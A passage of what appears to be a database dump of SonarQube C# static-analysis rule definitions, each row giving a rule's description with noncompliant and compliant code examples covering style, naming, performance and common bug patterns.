typeof(Apple).IsAssignableFrom(apple.GetType()); // Noncompliant\n    }\n    var appleType = typeof (Apple);\n    if (apple != null)\n    {\n      b = appleType.IsAssignableFrom(apple.GetType()); // Noncompliant\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Fruit { }\nsealed class Apple : Fruit { }\n\nclass Program\n{\n  static void Main()\n  {\n    var apple = new Apple();\n    var b = apple is Apple;\n    b = apple is Apple;\n    b = apple is Apple;\n    var appleType = typeof(Apple);\n    b = appleType.IsInstanceOfType(apple);\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453806352	1511453806353	1
91	Public constant members should not be used	S2339	\N	csharpsquid	<p>\n    Constant members are copied at compile time to the call sites, instead of being fetched at runtime.\n</p>\n<p>\n    As an example, say you have a library with a constant <code>Version</code> member set to <code>1.0</code>, and a\n    client application linked to it. This library is then updated and <code>Version</code> is set to <code>2.0</code>.\n    Unfortunately, even after the old DLL is replaced by the new one, <code>Version</code> will still be <code>1.0</code>\n    for the client application. In order to see <code>2.0</code>, the client application would need to be rebuilt\n    against the new version of the library.\n</p>\n<p>\n    This means that you should use constants to hold values that by definition will never change, such as <code>Zero</code>.\n    In practice, those cases are uncommon, and therefore it is generally better to avoid constant members.\n</p>\n<p>\n    This rule only reports issues on public constant fields, which can be reached from outside the defining assembly.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo\n{\n    public const double Version = 1.0;           // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Foo\n{\n    public static double Version\n    {\n      get { return 1.0; }\n    }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453806353	1511453806354	1
92	"catch" clauses should do more than rethrow	S2737	\N	csharpsquid	<p>\nA <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting it bubble up automatically, but with more code and the additional detrement of leaving maintainers scratching their heads.\nSuch clauses should either be eliminated or populated with the appropriate logic.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstring s = "";\ntry\n{\n  s = File.ReadAllText(fileName);\n}\ncatch (Exception e) // Noncompliant\n{\n  throw;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nstring s = "";\ntry\n{\n  s = File.ReadAllText(fileName);\n}\ncatch (Exception e)\n{\n  logger.LogError(e);\n  throw;\n}\n</pre>\nor\n<pre>\nstring s = File.ReadAllText(fileName);\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,finding,unused	f	HTML	1511453806354	1511453806355	1
93	Array covariance should not be used	S2330	\N	csharpsquid	<p>\n    Array covariance is the principle that if an implicit or explicit reference conversion exits from type <code>A</code> to\n    <code>B</code>, then the same conversion exists from the array type <code>A[]</code> to <code>B[]</code>.\n</p>\n<p>\n    While this array conversion can be useful in readonly situations to pass instances of <code>A[]</code> wherever\n    <code>B[]</code> is expected, it must be used with care, since assigning an instance of <code>B</code> into an array of\n    <code>A</code> will cause an <code>ArrayTypeMismatchException</code> to be thrown at runtime.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nabstract class Fruit { }\nclass Apple : Fruit { }\nclass Orange : Fruit { }\n\nclass Program\n{\n  static void Main(string[] args)\n  {\n    Fruit[] fruits = new Apple[1]; // Noncompliant - array covariance is used\n    FillWithOranges(fruits);\n  }\n\n  // Just looking at the code doesn't reveal anything suspicious\n  static void FillWithOranges(Fruit[] fruits)\n  {\n    for (int i = 0; i < fruits.Length; i++)\n    {\n      fruits[i] = new Orange(); // Will throw an ArrayTypeMismatchException\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nabstract class Fruit { }\nclass Apple : Fruit { }\nclass Orange : Fruit { }\n\nclass Program\n{\n  static void Main(string[] args)\n  {\n    Orange[] fruits = new Orange[1]; // Compliant\n    FillWithOranges(fruits);\n  }\n\n  static void FillWithOranges(Orange[] fruits)\n  {\n    for (int i = 0; i < fruits.Length; i++)\n    {\n      fruits[i] = new Orange();\n    }\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	pitfall	f	HTML	1511453806356	1511453806357	1
94	Method name should comply with a naming convention	S100	\N	csharpsquid	<p>\n    Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method names match a provided\n    regular expression.\n</p>\n\n<p>The following code:</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9_]*[a-zA-Z0-9]$</code>:</p>\n<pre>\npublic int doSomething(){...}\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\npublic int DoSomething(){...}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806357	1511453806358	1
95	Non-flags enums should not be used in bitwise operations	S3265	\N	csharpsquid	<p>\n    <code>enum</code>s are usually used to identify distinct elements in a set of values. However <code>enum</code>s can be treated as bit fields and \n    bitwise operations can be used on them to combine the values. This is a good way of specifying multiple elements of set with a single value. \n    When <code>enum</code>s are used this way, it is a best practice to mark the <code>enum</code> with the <code>FlagsAttribute</code>.\n</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nenum Permissions\n{\n  None = 0,\n  Read = 1,\n  Write = 2,\n  Execute = 4\n}\n// ...\nvar x = Permissions.Read | Permissions.Write;  // Noncompliant; enum is not marked with [Flags]\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n[Flags]\nenum Permissions\n{\n  None = 0,\n  Read = 1,\n  Write = 2,\n  Execute = 4\n}\n// ...\nvar x = Permissions.Read | Permissions.Write;\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453806362	1511453806363	1
96	Class names should comply with a naming convention	S101	\N	csharpsquid	<p>\nSharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.\nThis rule allows to check that all class names match a provided regular expression.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With default provided regular expression <code>^([A-HJ-Z][a-zA-Z0-9]+|I[a-z0-9][a-zA-Z0-9]*|[A-Z][a-zA-Z0-9]+Extensions)$</code>:</p>\n<pre>\nclass my_class {...}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {...}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806363	1511453806364	1
97	"IndexOf" checks should not be for positive numbers	S2692	\N	csharpsquid	<p>\n    Most checks against an <code>IndexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for\n    values <code>&gt;0</code> ignore the first element, which is likely a bug. If the intent is merely to check inclusion of a\n    value in a <code>string</code>, <code>List</code>, or an array, consider using the <code>Contains</code> method instead.\n</p>\n<p>\n    This rule raises an issue when an <code>IndexOf</code> value retrieved from a <code>string</code>, <code>List</code>,\n    or array is tested against <code>&gt;0</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstring color = "blue";\nstring name = "ishmael";\n\nList&lt;string&gt; strings = new List&lt;string&gt; ();\nstrings.add(color);\nstrings.add(name);\nstring[] stringArray = strings.ToArray();\n\nif (strings.IndexOf(color) &gt; 0) // Noncompliant\n{\n  // ...\n}\nif (name.IndexOf("ish") &gt; 0) // Noncompliant\n{\n  // ...\n}\nif (name.IndexOf("ae") &gt; 0) // Noncompliant\n{\n  // ...\n}\nif (Array.IndexOf(stringArray, color) &gt; 0) // Noncompliant\n{\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nstring color = "blue";\nstring name = "ishmael";\nList&lt;string&gt; strings = new List&lt;string&gt; ();\nstrings.add(color);\nstrings.add(name);\nstring[] stringArray = strings.ToArray();\nif (strings.IndexOf(color) &gt; -1)\n{\n  // ...\n}\nif (name.IndexOf("ish") &gt;= 0)\n{\n  // ...\n}\nif (name.Contains("ae")\n{\n  // ...\n}\nif (Array.IndexOf(stringArray, color) &gt;= 0)\n{\n  // ...\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453806368	1511453806368	1
98	Assignments should not be made from within sub-expressions	S1121	\N	csharpsquid	<p>\n    Assignments within sub-expressions are hard to spot and therefore make the code less readable.\n    It is also a common mistake to write <code>=</code> when <code>==</code> was meant.\n    Ideally, expressions should should not have side-effects.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\ndoSomething(i = 42);\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ni = 42;\ndoSomething(i);\n// or\ndoSomething(i == 42);  // Perhaps in fact the comparison operator was expected\n</pre>\n\n<h2>Exceptions</h2>\nAssignments inside lambda and delegate expressions are allowed.\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value</li>\n    <li>MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions</li>\n    <li>MISRA C:2012, 13.4 - The result of an assignment operator should not be used</li>\n    <li><a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,misra,suspicious	f	HTML	1511453806369	1511453806369	1
99	Floating point numbers should not be tested for equality	S1244	\N	csharpsquid	<p>\n    Floating point math is imprecise because of the challenges of storing such values in a binary\n    representation. Even worse, floating point math is not associative; push a <code>float</code> or a <code>double</code>\n    through a series of simple mathematical operations and the answer will be different based on\n    the order of those operation because of the rounding that takes place at each step.\n</p>\n<p>\n    Even simple floating point assignments are not simple:\n</p>\n<pre>\nfloat f = 0.100000001f; // 0.1\ndouble d = 0.10000000000000001; // 0.1\n</pre>\n\n<p>\n    (Results will vary based on compiler and compiler settings)\n</p>\n<p>\n    Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on\n    <code>float</code> or <code>double</code> values is almost always an error.\n</p>\n<p>\n    This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.\n</p>\n\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfloat myNumber = 3.146f;\nif ( myNumber == 3.146f ) //Noncompliant. Because of floating point imprecision, this will be false\n{\n  // ...\n}\n\nif (myNumber &lt;= 3.146f &amp;&amp; mNumber &gt;= 3.146f) // Noncompliant indirect equality test\n{\n  // ...\n}\n\nif (myNumber &lt; 4 || myNumber &gt; 4) // Noncompliant indirect inequality test\n{\n  // ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C:2004, 13.3 - Floating-point expressions shall not be tested for equality or inequality.</li>\n    <li>MISRA C++:2008, 6-2-2 - Floating-point expressions shall not be directly or indirectly tested for equality or inequality</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra	f	HTML	1511453806370	1511453806371	2
100	"IEnumerable" LINQs should be simplified	S2971	\N	csharpsquid	<p>\n    In the interests of readability, code that can be simplified should be simplified. To that end, there are several\n    ways <code>IEnumerable LINQ</code>s can be simplified\n</p>\n<ul>\n    <li>Use <code>OfType</code> instead of using <code>Select</code> with <code>as</code> to type cast elements and then\n    null-checking in a query expression to choose elements based on type.</li>\n    <li>Use <code>OfType</code> instead of using <code>Where</code> and the <code>is</code> operator, followed by a cast\n    in a <code>Select</code></li>\n    <li>Use an expression in <code>Any</code> instead of <code>Where(element => [expression]).Any()</code>.</li>\n    <li>Use <code>Count</code> instead of <code>Count()</code> when it's available.</li>\n    <li>Don't call <code>ToArray()</code> or <code>ToList()</code> in the middle of a query chain.</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nseq1.Select(element => element as T).Any(element => element != null);  // Noncompliant; use OfType\nseq2.Select(element => element as T).Any(element => element != null &amp;&amp; CheckCondition(element));  // Noncompliant; use OfType\nseq3.Where(element => element is T).Select(element => element as T); // Noncompliant; use OfType\nseq4.Where(element => element is T).Select(element => (T)element); // Noncompliant; use OfType\nseq.Where(element => [expression]).Any();  // Noncompliant; use Any([expression])\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nseq1.OfType&lt;T&gt;().Any();\nseq2.OfType&lt;T&gt;().Any(element => CheckCondition(element));\nseq3.OfType&lt;T&gt;();\nseq4.OfType&lt;T&gt;();\nseq.Any(element => [expression])\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453806371	1511453806372	1
101	Redundant modifiers should be removed	S2333	\N	csharpsquid	<p>\n    Unnecessary keywords simply clutter the code and should be removed. Specifically:\n    <ul>\n        <li><code>partial</code> on type declarations that are completely defined in one place</li>\n        <li><code>sealed</code> on members of <code>sealed</code> classes</li>\n        <li><code>unsafe</code> method or block inside construct already marked with <code>unsafe</code>, or when there are no <code>unsafe</code>\n        constructs in the block</li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic partial class MyClass // Noncompliant\n{\n  public virtual void Method()\n  {\n  }\n}\n\npublic sealed class MyOtherClass : MyClass\n{\n  public sealed override void Method() // Noncompliant\n  {\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass\n{\n  public virtual void Method()\n  {\n  }\n}\n\npublic sealed class MyOtherClass : MyClass\n{\n  public override void Method()\n  {\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	finding,unused	f	HTML	1511453806372	1511453806373	1
102	Instance members should not write to "static" fields	S2696	\N	csharpsquid	<p>\n    Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to\n    bugs if there are multiple class instances and/or multiple threads in play.\n</p>\n<p>\n    This rule raises an issue each time a <code>static</code> field is updated from a non-static method or property.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass\n{\n  private static int count = 0;\n\n  public void DoSomething()\n  {\n    //...\n    count++;  // Noncompliant\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	multi-threading	f	HTML	1511453806374	1511453806374	2
103	Boolean literals should not be redundant	S1125	\N	csharpsquid	<p>\n    Redundant Boolean literals should be removed from expressions to improve readability.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (booleanVariable == true) { /* ... */ }\nif (booleanVariable != true) { /* ... */ }\nif (booleanVariable || false) { /* ... */ }\ndoSomething(!false);\n\nbooleanVariable = condition ? true : exp;\nbooleanVariable = condition ? false : exp;\nbooleanVariable = condition ?  exp : true;\nbooleanVariable = condition ?  exp : false;\nbooleanVariable = condition ?  true : false;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (booleanVariable) { /* ... */ }\nif (!booleanVariable) { /* ... */ }\nif (booleanVariable) { /* ... */ }\ndoSomething(true);\n\nbooleanVariable = condition || exp;\nbooleanVariable = !condition && exp;\nbooleanVariable = !condition ||  exp;\nbooleanVariable = condition && exp;\nbooleanVariable = condition;\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453806375	1511453806376	1
104	Identical expressions should not be used on both sides of a binary operator	S1764	\N	csharpsquid	<p>\nUsing the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical operators, having the same value on both sides of an operator yields predictable results, and should be simplified.\n</p>\n<p>\nThis rule ignores <code>*</code>, <code>+</code>, and <code>=</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( a == a ) // always true\n{\n  doZ();\n}\nif ( a != a ) // always false\n{\n  doY();\n}\nif ( a == b &amp;&amp; a == b ) // if the first one is true, the second one is too\n{\n  doX();\n}\nif ( a == b || a == b ) // if the first one is true, the second one is too\n{\n  doW();\n}\n\nint j = 5 / 5; //always 1\nint k = 5 - 5; //always 0\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ndoZ();\n\nif ( a == b )\n{\n  doX();\n}\nif ( a == b )\n{\n  doW();\n}\n\nint j = 1;\nint k = 0;\n</pre>\n\n<h2>Exceptions</h2>\nLeft-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.\n<pre>\nint i = 1 << 1; // Compliant\nint j = a << a; // Noncompliant\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n    <li>Rule S1656 - Implements a check on <code>=</code>.</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert	f	HTML	1511453806376	1511453806377	2
105	Strings should not be concatenated using "+" in a loop	S1643	\N	csharpsquid	<p>\n    <code>StringBuilder</code> is more efficient than string concatenation, especially when the operator is repeated over and over as in loops.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstring str = "";\nfor (int i = 0; i &lt; arrayOfStrings.Length; ++i)\n{\n  str = str + arrayOfStrings[i];\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nStringBuilder bld = new StringBuilder();\nfor (int i = 0; i &lt; arrayOfStrings.Length; ++i)\n{\n  bld.Append(arrayOfStrings[i]);\n}\nstring str = bld.ToString();\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	performance	f	HTML	1511453806377	1511453806378	1
106	Implementations should be provided for "partial" methods	S3251	\N	csharpsquid	<p>\n    <code>partial</code> methods allow an increased degree of flexibility in programming a system. Hooks can be added to generated code\n    by invoking methods that define their signature, but might not have an implementation yet. But if the implementation is still missing\n    when the code makes it to production, the compiler silently removes the call. In the best case scenario, such calls simply represent\n    cruft, but in they worst case they are critical, missing functionality, the loss of which will lead to unexpected results at runtime.\n</p>\n<p>\n    This rule raises an issue for partial methods for which no implementation can be found in the assembly.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npartial class C\n{\n  partial void M(); //Noncompliant\n\n  void OtherM()\n  {\n    M(); //Noncompliant. Will be removed.\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	suspicious	f	HTML	1511453806379	1511453806379	1
107	Redundant casts should not be used	S1905	\N	csharpsquid	<p>\n    Unnecessary casting expressions make the code harder to read and understand.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int Example(int i)\n{\n  return (int) (i + 42); // Noncompliant\n}\npublic IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)\n{\n  return coll.Reverse().OfType&lt;int&gt;(); // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int Example(int i)\n{\n  return i + 42;\n}\npublic IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)\n{\n  return coll.Reverse();\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453806380	1511453806381	1
108	Empty statements should be removed	S1116	\N	csharpsquid	<p>\n  Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:\n  <ul>\n    <li>It was meant to be replaced by an actual statement, but this was forgotten.</li>\n    <li>There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>.</li>\n  </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething()\n{\n  ; // Noncompliant - was used as a kind of TODO marker\n}\n\nvoid doSomethingElse()\n{\n  Console.WriteLine("Hello, world!");;  // Noncompliant - double ;\n  ...\n  // Rarely, they are used on purpose as the body of a loop. It is a bad practice to\n  // have side-effects outside of the loop body\n  for (int i = 0; i < 3; Console.WriteLine(i), i++); // Noncompliant\n  ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvoid doSomething()\n{\n}\n\nvoid doSomethingElse()\n{\n  Console.WriteLine("Hello, world!");\n  ...\n  for (int i = 0; i < 3; i++)\n  {\n    Console.WriteLine(i);\n   }\n  ...\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that the first character following the null statement is a white-space character.</li>\n    <li>MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided that the first character following the null statement is a white-space character.</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,misra,unused	f	HTML	1511453806381	1511453806382	1
110	Unused type parameters should be removed	S2326	\N	csharpsquid	<p>\n    Type parameters that aren't used are dead code, which can only distract and possibly confuse\n    developers during maintenance. Therefore, unused type parameters should be removed.\n</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MoreMath&lt;T&gt; // Noncompliant; &lt;T&gt;is ignored\n{\n  public int Add&lt;T&gt;(int a, int b) // Noncompliant; &lt;T&gt; is ignored\n  {\n    return a + b;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MoreMath\n{\n  public int Add (int a, int b)\n  {\n    return a + b;\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453806387	1511453806388	1
111	Local variables should not shadow class fields	S1117	\N	csharpsquid	<p>\n    Shadowing fields with a local variable or with a method parameter is a bad practice that\n    reduces code readability: It makes it confusing to know whether the field or the variable\n    is being used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo\n{\n  public int myField;\n\n  public void doSomething()\n  {\n    int myField = 0;\n    ...\n  }\n\n  public void doSomethingElse(int myField)\n  {\n    ...\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    Constructors are exceptions; it is common practice to name arguments for the fields the\n    values will be assigned to. Static methods are also excepted.\n</p>\n\n<pre>\nclass Foo {\n  public int myField;\n\n  public Foo(int myField)\n  {\n    this.myField = myField;\n  }\n\n  public static Foo build(int myField)\n  {\n    ...\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453806388	1511453806389	1
112	Utility classes should not have public constructors	S1118	\N	csharpsquid	<p>\n    Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even\n    <code>abstract</code> utility classes, which can be extended, should not have <code>public</code> constructors.\n</p>\n<p>\n    C# adds an implicit public constructor to every class which does not explicitly define at least one constructor. Hence, at\n    least one <code>protected</code> constructor should be defined if you wish to subclass this utility class. Or the\n    <code>static</code> keyword should be added to the class declaration to prevent subclassing.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class StringUtils // Noncompliant\n{\n  public static string Concatenate(string s1, string s2)\n  {\n    return s1 + s2;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static class StringUtils\n{\n  public static string Concatenate(string s1, string s2)\n  {\n    return s1 + s2;\n  }\n}\n</pre>\nor\n<pre>\npublic class StringUtils\n{\n  protected StringUtils()\n  {\n  }\n  public static string Concatenate(string s1, string s2)\n  {\n    return s1 + s2;\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	design	f	HTML	1511453806389	1511453806390	1
113	"GetHashCode" should not reference mutable fields	S2328	\N	csharpsquid	<p>\n    <code>GetHashCode</code> is used to file an object in a <code>Dictionary</code> or <code>Hashtable</code>.\n    If <code>GetHashCode</code> uses non-<code>readonly</code> fields and those fields change after the object\n    is stored, the object immediately becomes mis-filed in the <code>Hashtable</code>. Any subsequent test to\n    see if the object is in the <code>Hashtable</code> will return a false negative.\n</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Person\n{\n  public int age;\n  public string name;\n\n  public override int GetHashCode()\n  {\n    int hash = 12;\n    hash += this.age.GetHashCode(); // Noncompliant\n    hash += this.name.GetHashCode(); // Noncompliant\n    return hash;\n  }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Person\n{\n  public readonly DateTime birthday;\n  public string name;\n\n  public override int GetHashCode()\n  {\n    int hash = 12;\n    hash += this.birthday.GetHashCode();\n    return hash;\n  }\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453806390	1511453806391	2
114	Default parameter values should not be passed as arguments	S3254	\N	csharpsquid	<p>\n    Specifying the default parameter values in a method call is redundant. Such values should be omitted in the interests of readability.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void M(int x, int y = 5, int z = 7) { /* ... */ }\n\n// ...\nM(1, 5); //Noncompliant, y has the default value\nM(1, z: 7); //Noncompliant, z has the default value\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void M(int x, int y=5, int z = 7) { /* ... */ }\n\n// ...\nM(1);\nM(1);\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy,finding	f	HTML	1511453806391	1511453806393	1
115	"base()" constructor calls should not be explicitly made	S3253	\N	csharpsquid	<p>\n    Since the compiler will automatically invoke the base type's no-argument constructor, there's no need to specify its invocation explicitly. Doing so just clutters the code.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass X\n{\n  public X()\n  {\n    /* ... */\n  }\n}\n\nclass Y : X\n{\n  public Y(int parameter) : base() // Noncompliant\n  {\n    /* does something with the parameter */\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass X\n{\n  public X()\n  {\n    /* ... */\n  }\n}\n\nclass Y : X\n{\n  public Y(int parameter)\n  {\n    /* does something with the parameter */\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy,finding	f	HTML	1511453806394	1511453806394	1
116	Multiline blocks should be enclosed in curly braces	S2681	\N	csharpsquid	<p>\nCurly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be misleading and induce bugs.\nThis rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block, but the omission of curly braces means the lines will be unconditionally executed once.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)\n  firstActionInBlock();\n  secondAction();  // Noncompliant; executed unconditionally\nthirdAction();\n\nstring str = null;\nfor (int i = 0; i < array.length; i++)\n  str = array[i];\n  doTheThing(str);  // Noncompliant; executed only on last array element\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (condition)\n{\n  firstActionInBlock();\n  secondAction();\n}\nthirdAction();\n\nstring str = null;\nfor (int i = 0; i < array.length; i++)\n{\n  str = array[i];\n  doTheThing(str);\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806395	1511453806395	2
117	Attribute, EventArgs, and Exception type names should end with the type being extended	S3376	\N	csharpsquid	<p>\n    Adherence to the standard naming conventions makes your code not only more readable, but more usable. For instance,\n    <code>class FirstAttribute : Attribute</code> can be used simply with <code>First</code>, but you must use the full\n    name for <code>class AttributeOne : Attribute</code>.\n</p>\n<p>\n    This rule raises an issue when classes extending <code>Attribute</code>, <code>EventArgs</code>, or\n    <code>Exception</code>, do not end with their parent class names.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass AttributeOne : Attribute  // Noncompliant\n{\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass FirstAttribute : Attribute\n{\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    If a class' direct base class doesn't follow the convention, then no issue is reported on the class itself, regardless of\n    whether or not it conforms to the convention.\n</p>\n<pre>\nclass Timeout : Exception // Noncompliant\n{\n}\nclass ExtendedTimeout : Timeout // Ignored; doesn't conform to convention, but the direct base doesn't conform either\n{\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806396	1511453806396	1
